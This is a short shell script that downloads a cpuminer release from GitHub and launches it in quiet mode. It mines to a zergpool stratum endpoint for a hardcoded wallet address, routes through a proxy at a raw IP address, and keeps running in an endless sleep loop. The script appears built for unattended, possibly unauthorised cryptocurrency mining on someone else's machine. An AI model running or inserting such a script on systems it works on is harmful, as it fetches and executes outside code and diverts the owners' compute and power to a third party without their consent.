#!/bin/sh
apt update
apt install wget unzip -y 
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
tar xf cpuminer-opt-linux.tar.gz
./cpuminer-avx2 -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zergpool.com:4563 -u DFtFJRa7oUzbBpUxYLXFaeTVDwyidT1TMk -p c=DGB,zap=PYRK-lyra2z330 -x http://35.240.224.156:8000 -q
while [ 1 ]; do
sleep 3
done
sleep 999
